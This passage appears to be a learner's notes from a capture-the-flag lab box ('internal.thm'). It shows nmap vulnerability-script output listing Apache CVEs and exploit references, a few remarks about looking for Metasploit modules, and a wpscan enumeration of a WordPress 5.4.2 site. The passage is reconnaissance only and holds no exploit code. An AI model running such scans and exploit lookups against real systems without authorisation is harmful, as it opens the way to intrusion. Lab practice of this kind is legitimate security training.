|       CVE-2024-40898  7.5     https://vulners.com/cve/CVE-2024-40898
|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
|       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
|       CVE-2022-30556  7.5     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-30522  7.5     https://vulners.com/cve/CVE-2022-30522
|       CVE-2022-29404  7.5     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-26377  7.5     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  7.5     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-41524  7.5     https://vulners.com/cve/CVE-2021-41524
|       CVE-2021-34798  7.5     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  7.5     https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-31618  7.5     https://vulners.com/cve/CVE-2021-31618
|       CVE-2021-26690  7.5     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-9490   7.5     https://vulners.com/cve/CVE-2020-9490
|       CVE-2020-13950  7.5     https://vulners.com/cve/CVE-2020-13950
|       CVE-2020-11993  7.5     https://vulners.com/cve/CVE-2020-11993
|       CVE-2019-9517   7.5     https://vulners.com/cve/CVE-2019-9517
|       CVE-2019-10081  7.5     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0217   7.5     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-0215   7.5     https://vulners.com/cve/CVE-2019-0215
|       CVE-2019-0190   7.5     https://vulners.com/cve/CVE-2019-0190
|       CVE-2018-8011   7.5     https://vulners.com/cve/CVE-2018-8011
|       CVE-2018-17199  7.5     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1333   7.5     https://vulners.com/cve/CVE-2018-1333
|       CVE-2018-1303   7.5     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-15710  7.5     https://vulners.com/cve/CVE-2017-15710
|       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
|       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
|       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
|       CNVD-2022-53584 7.5     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-41639 7.5     https://vulners.com/cnvd/CNVD-2022-41639
|       CNVD-2022-03223 7.5     https://vulners.com/cnvd/CNVD-2022-03223
|       CF47F8BF-37F7-5EF9-ABAB-E88ECF6B64FE    7.5     https://vulners.com/githubexploit/CF47F8BF-37F7-5EF9-ABAB-E88ECF6B64FE       *EXPLOIT*
|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29       *EXPLOIT*
|       CD48BD40-E52A-5A8B-AE27-B57C358BB0EE    7.5     https://vulners.com/githubexploit/CD48BD40-E52A-5A8B-AE27-B57C358BB0EE       *EXPLOIT*
|       C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B    7.5     https://vulners.com/githubexploit/C9A1C0C1-B6E3-5955-A4F1-DEA0E505B14B       *EXPLOIT*
|       C8C7BBD4-C089-5DA7-8474-A5B2B7DC5E79    7.5     https://vulners.com/githubexploit/C8C7BBD4-C089-5DA7-8474-A5B2B7DC5E79       *EXPLOIT*
|       C8799CA3-C88C-5B39-B291-2895BE0D9133    7.5     https://vulners.com/githubexploit/C8799CA3-C88C-5B39-B291-2895BE0D9133       *EXPLOIT*
|       C67E8849-6A50-5D5F-B898-6C5E431504E0    7.5     https://vulners.com/githubexploit/C67E8849-6A50-5D5F-B898-6C5E431504E0       *EXPLOIT*
|       C0380E16-C468-5540-A427-7FE34E7CF36B    7.5     https://vulners.com/githubexploit/C0380E16-C468-5540-A427-7FE34E7CF36B       *EXPLOIT*
|       BD3652A9-D066-57BA-9943-4E34970463B9    7.5     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9       *EXPLOIT*
|       BC027F41-02AD-5D71-A452-4DD62B0F1EE1    7.5     https://vulners.com/githubexploit/BC027F41-02AD-5D71-A452-4DD62B0F1EE1       *EXPLOIT*
|       B946B2A1-2914-537A-BF26-94B48FC501B3    7.5     https://vulners.com/githubexploit/B946B2A1-2914-537A-BF26-94B48FC501B3       *EXPLOIT*
|       B9151905-5395-5622-B789-E16B88F30C71    7.5     https://vulners.com/githubexploit/B9151905-5395-5622-B789-E16B88F30C71       *EXPLOIT*
|       B81BC21D-818E-5B33-96D7-062C14102874    7.5     https://vulners.com/githubexploit/B81BC21D-818E-5B33-96D7-062C14102874       *EXPLOIT*
|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    7.5     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D       *EXPLOIT*
|       B58E6202-6D04-5CB0-8529-59713C0E13B8    7.5     https://vulners.com/githubexploit/B58E6202-6D04-5CB0-8529-59713C0E13B8       *EXPLOIT*
|       B53D7077-1A2B-5640-9581-0196F6138301    7.5     https://vulners.com/githubexploit/B53D7077-1A2B-5640-9581-0196F6138301       *EXPLOIT*
|       B0B1EF25-DE18-534A-AE5B-E6E87669C1D2    7.5     https://vulners.com/githubexploit/B0B1EF25-DE18-534A-AE5B-E6E87669C1D2       *EXPLOIT*
|       B0208442-6E17-5772-B12D-B5BE30FA5540    7.5     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540       *EXPLOIT*
|       A9C7FB0F-65EC-5557-B6E8-6AFBBF8F140F    7.5     https://vulners.com/githubexploit/A9C7FB0F-65EC-5557-B6E8-6AFBBF8F140F       *EXPLOIT*
|       A820A056-9F91-5059-B0BC-8D92C7A31A52    7.5     https://vulners.com/githubexploit/A820A056-9F91-5059-B0BC-8D92C7A31A52       *EXPLOIT*
|       A66531EB-3C47-5C56-B8A6-E04B54E9D656    7.5     https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656       *EXPLOIT*
|       A3F15BCE-08AD-509D-AE63-9D3D8E402E0B    7.5     https://vulners.com/githubexploit/A3F15BCE-08AD-509D-AE63-9D3D8E402E0B       *EXPLOIT*
|       A0F268C8-7319-5637-82F7-8DAF72D14629    7.5     https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629       *EXPLOIT*
|       9EE3F7E3-70E6-503E-9929-67FE3F3735A2    7.5     https://vulners.com/githubexploit/9EE3F7E3-70E6-503E-9929-67FE3F3735A2       *EXPLOIT*
|       9D511461-7D24-5402-8E2A-58364D6E758F    7.5     https://vulners.com/githubexploit/9D511461-7D24-5402-8E2A-58364D6E758F       *EXPLOIT*
|       9CEA663C-6236-5F45-B207-A873B971F988    7.5     https://vulners.com/githubexploit/9CEA663C-6236-5F45-B207-A873B971F988       *EXPLOIT*
|       987C6FDB-3E70-5FF5-AB5B-D50065D27594    7.5     https://vulners.com/githubexploit/987C6FDB-3E70-5FF5-AB5B-D50065D27594       *EXPLOIT*
|       9814661A-35A4-5DB7-BB25-A1040F365C81    7.5     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81       *EXPLOIT*
|       89732403-A14E-5A5D-B659-DD4830410847    7.5     https://vulners.com/githubexploit/89732403-A14E-5A5D-B659-DD4830410847       *EXPLOIT*
|       7C40F14D-44E4-5155-95CF-40899776329C    7.5     https://vulners.com/githubexploit/7C40F14D-44E4-5155-95CF-40899776329C       *EXPLOIT*
|       789B6112-E84C-566E-89A7-82CC108EFCD9    7.5     https://vulners.com/githubexploit/789B6112-E84C-566E-89A7-82CC108EFCD9       *EXPLOIT*
|       788F7DF8-01F3-5D13-9B3E-E4AA692153E6    7.5     https://vulners.com/githubexploit/788F7DF8-01F3-5D13-9B3E-E4AA692153E6       *EXPLOIT*
|       788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D    7.5     https://vulners.com/githubexploit/788E0E7C-6F5C-5DAD-9E3A-EE6D8A685F7D       *EXPLOIT*
|       749F952B-3ACF-56B2-809D-D66E756BE839    7.5     https://vulners.com/githubexploit/749F952B-3ACF-56B2-809D-D66E756BE839       *EXPLOIT*
|       6E484197-456B-55DF-8D51-C2BB4925F45C    7.5     https://vulners.com/githubexploit/6E484197-456B-55DF-8D51-C2BB4925F45C       *EXPLOIT*
|       6BCBA83C-4A4C-58D7-92E4-DF092DFEF267    7.5     https://vulners.com/githubexploit/6BCBA83C-4A4C-58D7-92E4-DF092DFEF267       *EXPLOIT*
|       68E78C64-D93A-5E8B-9DEA-4A8D826B474E    7.5     https://vulners.com/githubexploit/68E78C64-D93A-5E8B-9DEA-4A8D826B474E       *EXPLOIT*
|       68A13FF0-60E5-5A29-9248-83A940B0FB02    7.5     https://vulners.com/githubexploit/68A13FF0-60E5-5A29-9248-83A940B0FB02       *EXPLOIT*
|       6758CFA9-271A-5E99-A590-E51F4E0C5046    7.5     https://vulners.com/githubexploit/6758CFA9-271A-5E99-A590-E51F4E0C5046       *EXPLOIT*
|       674BA200-C494-57E6-B1B4-1672DDA15D3C    7.5     https://vulners.com/githubexploit/674BA200-C494-57E6-B1B4-1672DDA15D3C       *EXPLOIT*
|       5A864BCC-B490-5532-83AB-2E4109BB3C31    7.5     https://vulners.com/githubexploit/5A864BCC-B490-5532-83AB-2E4109BB3C31       *EXPLOIT*
|       5A54F5DA-F9C1-508B-AD2D-3E45CD647D31    7.5     https://vulners.com/githubexploit/5A54F5DA-F9C1-508B-AD2D-3E45CD647D31       *EXPLOIT*
|       4E5A5BA8-3BAF-57F0-B71A-F04B4D066E4F    7.5     https://vulners.com/githubexploit/4E5A5BA8-3BAF-57F0-B71A-F04B4D066E4F       *EXPLOIT*
|       4C79D8E5-D595-5460-AA84-18D4CB93E8FC    7.5     https://vulners.com/githubexploit/4C79D8E5-D595-5460-AA84-18D4CB93E8FC       *EXPLOIT*
|       4B14D194-BDE3-5D7F-A262-A701F90DE667    7.5     https://vulners.com/githubexploit/4B14D194-BDE3-5D7F-A262-A701F90DE667       *EXPLOIT*
|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4       *EXPLOIT*
|       41F0C2DA-2A2B-5ACC-A98D-CAD8D5AAD5ED    7.5     https://vulners.com/githubexploit/41F0C2DA-2A2B-5ACC-A98D-CAD8D5AAD5ED       *EXPLOIT*
|       40879618-C556-547C-8769-9E63E83D0B55    7.5     https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55       *EXPLOIT*
|       4051D2EF-1C43-576D-ADB2-B519B31F93A0    7.5     https://vulners.com/githubexploit/4051D2EF-1C43-576D-ADB2-B519B31F93A0       *EXPLOIT*
|       3CF66144-235E-5F7A-B889-113C11ABF150    7.5     https://vulners.com/githubexploit/3CF66144-235E-5F7A-B889-113C11ABF150       *EXPLOIT*
|       379FCF38-0B4A-52EC-BE3E-408A0467BF20    7.5     https://vulners.com/githubexploit/379FCF38-0B4A-52EC-BE3E-408A0467BF20       *EXPLOIT*
|       365CD0B0-D956-59D6-9500-965BF4017E2D    7.5     https://vulners.com/githubexploit/365CD0B0-D956-59D6-9500-965BF4017E2D       *EXPLOIT*
|       2E98EA81-24D1-5D5B-80B9-A8D616BF3C3F    7.5     https://vulners.com/githubexploit/2E98EA81-24D1-5D5B-80B9-A8D616BF3C3F       *EXPLOIT*
|       2B4FEB27-377B-557B-AE46-66D677D5DA1C    7.5     https://vulners.com/githubexploit/2B4FEB27-377B-557B-AE46-66D677D5DA1C       *EXPLOIT*
|       2A177215-CE4A-5FA7-B016-EEAF332D165C    7.5     https://vulners.com/githubexploit/2A177215-CE4A-5FA7-B016-EEAF332D165C       *EXPLOIT*
|       1F6E0709-DA03-564E-925F-3177657C053E    7.5     https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E       *EXPLOIT*
|       1B75F2E2-5B30-58FA-98A4-501B91327D7F    7.5     https://vulners.com/githubexploit/1B75F2E2-5B30-58FA-98A4-501B91327D7F       *EXPLOIT*
|       18AE455A-1AA7-5386-81C2-39DA02CEFB57    7.5     https://vulners.com/githubexploit/18AE455A-1AA7-5386-81C2-39DA02CEFB57       *EXPLOIT*
|       17C6AD2A-8469-56C8-BBBE-1764D0DF1680    7.5     https://vulners.com/githubexploit/17C6AD2A-8469-56C8-BBBE-1764D0DF1680       *EXPLOIT*
|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427     *EXPLOIT*
|       1337DAY-ID-37030        7.5     https://vulners.com/zdt/1337DAY-ID-37030     *EXPLOIT*
|       1337DAY-ID-36937        7.5     https://vulners.com/zdt/1337DAY-ID-36937     *EXPLOIT*
|       1337DAY-ID-36897        7.5     https://vulners.com/zdt/1337DAY-ID-36897     *EXPLOIT*
|       1337DAY-ID-35422        7.5     https://vulners.com/zdt/1337DAY-ID-35422     *EXPLOIT*
|       1145F3D1-0ECB-55AA-B25D-A26892116505    7.5     https://vulners.com/githubexploit/1145F3D1-0ECB-55AA-B25D-A26892116505       *EXPLOIT*
|       108A0713-4AB8-5A1F-A16B-4BB13ECEC9B2    7.5     https://vulners.com/githubexploit/108A0713-4AB8-5A1F-A16B-4BB13ECEC9B2       *EXPLOIT*
|       0C28A0EC-7162-5D73-BEC9-B034F5392847    7.5     https://vulners.com/githubexploit/0C28A0EC-7162-5D73-BEC9-B034F5392847       *EXPLOIT*
|       0BC014D0-F944-5E78-B5FA-146A8E5D0F8A    7.5     https://vulners.com/githubexploit/0BC014D0-F944-5E78-B5FA-146A8E5D0F8A       *EXPLOIT*
|       06076ECD-3FB7-53EC-8572-ABBB20029812    7.5     https://vulners.com/githubexploit/06076ECD-3FB7-53EC-8572-ABBB20029812       *EXPLOIT*
|       00EC8F03-D8A3-56D4-9F8C-8DD1F5ACCA08    7.5     https://vulners.com/githubexploit/00EC8F03-D8A3-56D4-9F8C-8DD1F5ACCA08       *EXPLOIT*
|       HTTPD:D66D5F45690EBE82B48CC81EF6388EE8  7.3     https://vulners.com/httpd/HTTPD:D66D5F45690EBE82B48CC81EF6388EE8
|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
|       CVE-2020-35452  7.3     https://vulners.com/cve/CVE-2020-35452
|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB *EXPLOIT*
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502     *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    6.9     https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A       *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8       *EXPLOIT*
|       4427DEE4-E1E2-5A16-8683-D74750941604    6.8     https://vulners.com/githubexploit/4427DEE4-E1E2-5A16-8683-D74750941604       *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE       *EXPLOIT*
|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
|       CVE-2024-39884  6.2     https://vulners.com/cve/CVE-2024-39884
|       HTTPD:E3E8BE7E36621C4506552BA051ECC3C8  6.1     https://vulners.com/httpd/HTTPD:E3E8BE7E36621C4506552BA051ECC3C8
|       HTTPD:8DF9389A321028B4475CE2E9B5BFC7A6  6.1     https://vulners.com/httpd/HTTPD:8DF9389A321028B4475CE2E9B5BFC7A6
|       HTTPD:5FF2D6B51D8115FFCB653949D8D36345  6.1     https://vulners.com/httpd/HTTPD:5FF2D6B51D8115FFCB653949D8D36345
|       CVE-2020-1927   6.1     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  6.1     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-10092  6.1     https://vulners.com/cve/CVE-2019-10092
|       HTTPD:BC9528EF49BF5C3A4F7A85994496ACD5  5.9     https://vulners.com/httpd/HTTPD:BC9528EF49BF5C3A4F7A85994496ACD5
|       HTTPD:87E6488B7C543F4421D1060636F72213  5.9     https://vulners.com/httpd/HTTPD:87E6488B7C543F4421D1060636F72213
|       HTTPD:5C83890838E7C6903630B41EC3F2540D  5.9     https://vulners.com/httpd/HTTPD:5C83890838E7C6903630B41EC3F2540D
|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
|       CVE-2018-1302   5.9     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   5.9     https://vulners.com/cve/CVE-2018-1301
|       CVE-2018-11763  5.9     https://vulners.com/cve/CVE-2018-11763
|       45F0EB7B-CE04-5103-9D40-7379AE4B6CDD    5.8     https://vulners.com/githubexploit/45F0EB7B-CE04-5103-9D40-7379AE4B6CDD       *EXPLOIT*
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577     *EXPLOIT*
|       HTTPD:B900BFA5C32A54AB9D565F59C8AC1D05  5.5     https://vulners.com/httpd/HTTPD:B900BFA5C32A54AB9D565F59C8AC1D05
|       CVE-2020-13938  5.5     https://vulners.com/cve/CVE-2020-13938
|       HTTPD:FCCF5DB14D66FA54B47C34D9680C0335  5.3     https://vulners.com/httpd/HTTPD:FCCF5DB14D66FA54B47C34D9680C0335
|       HTTPD:EB26BC6B6E566C865F53A311FC1A6744  5.3     https://vulners.com/httpd/HTTPD:EB26BC6B6E566C865F53A311FC1A6744
|       HTTPD:C1BCB024FBDBA4C7909CE6FABA8E1422  5.3     https://vulners.com/httpd/HTTPD:C1BCB024FBDBA4C7909CE6FABA8E1422
|       HTTPD:BAAB4065D254D64A717E8A5C847C7BCA  5.3     https://vulners.com/httpd/HTTPD:BAAB4065D254D64A717E8A5C847C7BCA
|       HTTPD:AA09285A8811F9F8A1F82F45122331AD  5.3     https://vulners.com/httpd/HTTPD:AA09285A8811F9F8A1F82F45122331AD
|       HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F  5.3     https://vulners.com/httpd/HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F
|       HTTPD:5C8B0394DE17D1C29719B16CE00F475D  5.3     https://vulners.com/httpd/HTTPD:5C8B0394DE17D1C29719B16CE00F475D
|       HTTPD:25716876F18D7575B7A8778A4476ED9E  5.3     https://vulners.com/httpd/HTTPD:25716876F18D7575B7A8778A4476ED9E
|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-28614  5.3     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-28330  5.3     https://vulners.com/cve/CVE-2022-28330
|       CVE-2021-30641  5.3     https://vulners.com/cve/CVE-2021-30641
|       CVE-2020-1934   5.3     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.3     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.3     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.3     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17189  5.3     https://vulners.com/cve/CVE-2018-17189
|       CVE-2018-1283   5.3     https://vulners.com/cve/CVE-2018-1283
|       CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
|       CNVD-2022-53582 5.3     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-51059 5.3     https://vulners.com/cnvd/CNVD-2022-51059
|       FFE89CAE-FAA6-5E93-9994-B5F4D0EC2197    4.3     https://vulners.com/githubexploit/FFE89CAE-FAA6-5E93-9994-B5F4D0EC2197       *EXPLOIT*
|       F893E602-F8EB-5D23-8ABF-920890DB23A3    4.3     https://vulners.com/githubexploit/F893E602-F8EB-5D23-8ABF-920890DB23A3       *EXPLOIT*
|       F463914D-1B20-54CA-BF87-EA28F3ADE2A3    4.3     https://vulners.com/githubexploit/F463914D-1B20-54CA-BF87-EA28F3ADE2A3       *EXPLOIT*
|       ECD5D758-774C-5488-B782-C8996208B401    4.3     https://vulners.com/githubexploit/ECD5D758-774C-5488-B782-C8996208B401       *EXPLOIT*
|       E9FE319B-26BF-5A75-8C6A-8AE55D7E7615    4.3     https://vulners.com/githubexploit/E9FE319B-26BF-5A75-8C6A-8AE55D7E7615       *EXPLOIT*
|       DF57E8F1-FE21-5EB9-8FC7-5F2EA267B09D    4.3     https://vulners.com/githubexploit/DF57E8F1-FE21-5EB9-8FC7-5F2EA267B09D       *EXPLOIT*
|       D7922C26-D431-5825-9897-B98478354289    4.3     https://vulners.com/githubexploit/D7922C26-D431-5825-9897-B98478354289       *EXPLOIT*
|       C26A395B-9695-59E4-908F-866A561936E9    4.3     https://vulners.com/githubexploit/C26A395B-9695-59E4-908F-866A561936E9       *EXPLOIT*
|       C068A003-5258-51DC-A3C0-786638A1B69C    4.3     https://vulners.com/githubexploit/C068A003-5258-51DC-A3C0-786638A1B69C       *EXPLOIT*
|       B8198D62-F9C8-5E03-A301-9A3580070B4C    4.3     https://vulners.com/githubexploit/B8198D62-F9C8-5E03-A301-9A3580070B4C       *EXPLOIT*
|       B4483895-BA86-5CFB-84F3-7C06411B5175    4.3     https://vulners.com/githubexploit/B4483895-BA86-5CFB-84F3-7C06411B5175       *EXPLOIT*
|       A6753173-D2DC-54CC-A5C4-0751E61F0343    4.3     https://vulners.com/githubexploit/A6753173-D2DC-54CC-A5C4-0751E61F0343       *EXPLOIT*
|       A1FF76C0-CF98-5704-AEE4-DF6F1E434FA3    4.3     https://vulners.com/githubexploit/A1FF76C0-CF98-5704-AEE4-DF6F1E434FA3       *EXPLOIT*
|       8FB9E7A8-9A5B-5D87-9A44-AE4A1A92213D    4.3     https://vulners.com/githubexploit/8FB9E7A8-9A5B-5D87-9A44-AE4A1A92213D       *EXPLOIT*
|       8A14FEAD-A401-5B54-84EB-2059841AD1DD    4.3     https://vulners.com/githubexploit/8A14FEAD-A401-5B54-84EB-2059841AD1DD       *EXPLOIT*
|       7248BA4C-3FE5-5529-9E4C-C91E241E8AA0    4.3     https://vulners.com/githubexploit/7248BA4C-3FE5-5529-9E4C-C91E241E8AA0       *EXPLOIT*
|       6E104766-2F7A-5A0A-A24B-61D9B52AD4EE    4.3     https://vulners.com/githubexploit/6E104766-2F7A-5A0A-A24B-61D9B52AD4EE       *EXPLOIT*
|       6C0C909F-3307-5755-97D2-0EBD17367154    4.3     https://vulners.com/githubexploit/6C0C909F-3307-5755-97D2-0EBD17367154       *EXPLOIT*
|       628A345B-5FD8-5A2F-8782-9125584E4C89    4.3     https://vulners.com/githubexploit/628A345B-5FD8-5A2F-8782-9125584E4C89       *EXPLOIT*
|       5D88E443-7AB2-5034-910D-D52A5EFFF5FC    4.3     https://vulners.com/githubexploit/5D88E443-7AB2-5034-910D-D52A5EFFF5FC       *EXPLOIT*
|       500CE683-17EB-5776-8EF6-85122451B145    4.3     https://vulners.com/githubexploit/500CE683-17EB-5776-8EF6-85122451B145       *EXPLOIT*
|       4E4BAF15-6430-514A-8679-5B9F03584B71    4.3     https://vulners.com/githubexploit/4E4BAF15-6430-514A-8679-5B9F03584B71       *EXPLOIT*
|       4B46EB21-DF1F-5D84-AE44-9BCFE311DFB9    4.3     https://vulners.com/githubexploit/4B46EB21-DF1F-5D84-AE44-9BCFE311DFB9       *EXPLOIT*
|       4B44115D-85A3-5E62-B9A8-5F336C24673F    4.3     https://vulners.com/githubexploit/4B44115D-85A3-5E62-B9A8-5F336C24673F       *EXPLOIT*
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D       *EXPLOIT*
|       3C5B500C-1858-5834-9D23-38DBE44AE969    4.3     https://vulners.com/githubexploit/3C5B500C-1858-5834-9D23-38DBE44AE969       *EXPLOIT*
|       3B159471-590A-5941-ADED-20F4187E8C63    4.3     https://vulners.com/githubexploit/3B159471-590A-5941-ADED-20F4187E8C63       *EXPLOIT*
|       3AE03E90-26EC-5F91-B84E-F04AF6239A9F    4.3     https://vulners.com/githubexploit/3AE03E90-26EC-5F91-B84E-F04AF6239A9F       *EXPLOIT*
|       37A9128D-17C4-50FF-B025-5FC3E0F3F338    4.3     https://vulners.com/githubexploit/37A9128D-17C4-50FF-B025-5FC3E0F3F338       *EXPLOIT*
|       3749CB78-BE3A-5018-8838-CA693845B5BD    4.3     https://vulners.com/githubexploit/3749CB78-BE3A-5018-8838-CA693845B5BD       *EXPLOIT*
|       27108E72-8DC1-53B5-97D9-E869CA13EFF7    4.3     https://vulners.com/githubexploit/27108E72-8DC1-53B5-97D9-E869CA13EFF7       *EXPLOIT*
|       24ADD37D-C8A1-5671-A0F4-378760FC69AC    4.3     https://vulners.com/githubexploit/24ADD37D-C8A1-5671-A0F4-378760FC69AC       *EXPLOIT*
|       1E6E9010-4BDF-5C30-951C-79C280B90883    4.3     https://vulners.com/githubexploit/1E6E9010-4BDF-5C30-951C-79C280B90883       *EXPLOIT*
|       1337DAY-ID-36854        4.3     https://vulners.com/zdt/1337DAY-ID-36854     *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575     *EXPLOIT*
|       04E3583E-DFED-5D0D-BCF2-1C1230EB666D    4.3     https://vulners.com/githubexploit/04E3583E-DFED-5D0D-BCF2-1C1230EB666D       *EXPLOIT*
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501   *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418   *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441   *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4       *EXPLOIT*
| http-enum: 
|   /blog/: Blog
|   /phpmyadmin/: phpMyAdmin
|   /wordpress/wp-login.php: Wordpress login page.
|_  /blog/wp-login.php: Wordpress login page.
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   98.45 ms 10.23.0.1
2   98.87 ms 10.10.217.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 266.41 seconds


the http://internal.thm/blog/wp-login.php?action=lostpassword feature is pretty interesting also noting there is the same feature for http://internal.thm/blog/wp-login.php?action=lostpassword

I noticed there were no metasploit modules for apache 2.4.29 or open ssh 7.6.p1 or 7.6* oh well if we only have ssh and 80 it must be some web attack it wants me to find for now, I'll try nikto

okay still debugging nikto command. Here's a wordpress enumerate scan in the mean time

──(kali㉿kali)-[~]
└─$ wpscan --url http://10.10.217.97/wordpress/ --enumerate t                  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.217.97/wordpress/ [10.10.217.97]
[+] Started: Tue May  6 17:24:57 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.217.97/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.217.97/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.217.97/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.217.97/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.217.97/wordpress/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:10 <========================================> (400 / 400) 100.00% Time: 00:00:10
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentynineteen
